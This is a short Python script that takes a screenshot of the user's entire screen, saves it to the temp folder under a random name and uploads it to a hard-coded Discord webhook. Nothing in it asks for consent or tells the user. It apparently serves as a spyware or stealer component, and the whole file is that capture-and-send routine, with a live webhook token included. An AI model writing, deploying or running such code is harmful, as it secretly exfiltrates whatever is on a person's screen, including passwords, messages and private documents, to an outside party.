import pyautogui
import tempfile
import random
import discord_webhook

WEBHOOK_URL = "https://discordapp.com/api/webhooks/1065724710366740520/B-719Ud2Ma-p1Ny6NIjpzj6bQJe45YXfHtZuu7VkDrdpn9_4wkrp84eYAlqMqaudfIr7"

screenshot = pyautogui.screenshot()
number = str(random.randint(0,1000))
directory = tempfile.gettempdir() + "/abc-" + number + ".png"
screenshot.save(directory)

webhook = discord_webhook.DiscordWebhook(WEBHOOK_URL)

with open(directory, "rb") as f:
    webhook.add_file(file=f.read(), filename="screenshot.png")

response = webhook.execute()